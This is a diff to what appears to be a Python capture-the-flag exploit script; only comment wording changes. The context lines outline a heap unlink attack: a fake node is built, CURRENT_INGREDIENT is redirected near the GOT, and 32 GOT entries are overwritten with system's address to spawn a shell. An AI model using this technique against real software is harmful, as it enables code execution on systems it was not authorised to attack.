@@ -112,10 +112,10 @@ if __name__ == "__main__":
     #
     # [5] make the fake second node
     #
-    # CURRENT_INGREDIENT will be 0x804cff8 after unlinking 
+    # CURRENT_INGREDIENT will be 0x804cff8 after the unlinking 
     # 0x804cff8->next == 0 (PERFECT!!!)
     # 0x804cff8 + 8 == 0x804d000
-    # GOT start 0x804d00c
+    # GOT starts at 0x804d00c
     # 
     # memcpy((char *)CURRENT_INGREDIENT + 8, "sh; \x00\x00\x00\x00" + p32(SYSTEM_ADDR)*32")
     #
@@ -133,7 +133,7 @@ if __name__ == "__main__":
     # [6] overwrite the first node to 0x804d098
     #
     # 0x804d098->next == 0x804d09c == CURRENT_INGREDIENT
-    # so, CURRENT_INGREDIENT will point 0x804cff8 after unlinking
+    # so, CURRENT_INGREDIENT will point 0x804cff8 after the unlinking
     #
     raw_input('[6] go?')
     s('c')
@@ -145,7 +145,7 @@ if __name__ == "__main__":
     r.recv()
 
     #
-    # [7] free the second node
+    # [7] unlink the second node
     # 
     raw_input('[7] go?')
     
@@ -157,7 +157,7 @@ if __name__ == "__main__":
     #
     # [8] overwrite 32 got entries
     #
-    # now, CURRENT_INGREDIENT == 0x804cff8
+    # after the unlinking, CURRENT_INGREDIENT == 0x804cff8
     # 'ag' => memcpy((char *)CURRENT_INGREDIENT + 8, "sh; \x00\x00\x00\x00" + p32(SYSTEM_ADDR)*32")
     #
     raw_input('[8] go?')
